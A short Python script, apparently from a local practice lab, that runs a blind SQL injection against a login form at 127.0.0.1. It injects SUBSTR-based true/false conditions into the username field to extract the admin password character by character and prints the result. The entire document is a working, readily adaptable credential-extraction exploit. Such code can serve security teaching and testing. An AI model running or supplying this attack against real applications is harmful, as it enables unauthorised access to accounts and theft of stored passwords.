import requests
import string
import sys

# The URL of our local vulnerable application
URL = "http://127.0.0.1:5000/"
# Characters we will test (lowercase, numbers, and some symbols)
CHARSET = string.ascii_lowercase + string.digits + "_-"

print("Starting Blind SQL Injection Attack...")
print("Extracting admin password:\n")

password = ""
position = 1

while True:
    char_found = False
    for char in CHARSET:
        # We ask: Is the character at 'position' equal to 'char'?
        payload = f"admin' AND (SUBSTR(password, {position}, 1) = '{char}') --"

        data = {
            "username": payload,
            "password": "any",  # Password doesn't matter due to the comment
        }

        # Send the POST request
        response = requests.post(URL, data=data)

        # If 'Invalid' is NOT in the response, our True/False question evaluated to True!
        if "Invalid student ID" not in response.text:
            password += char
            sys.stdout.write(char)
            sys.stdout.flush()
            position += 1
            char_found = True
            break  # Move to the next position

    # If we loop through the whole charset and find nothing, we've reached the end
    if not char_found:
        break

print(f"\n\nExtraction Complete! Admin Password is: {password}")
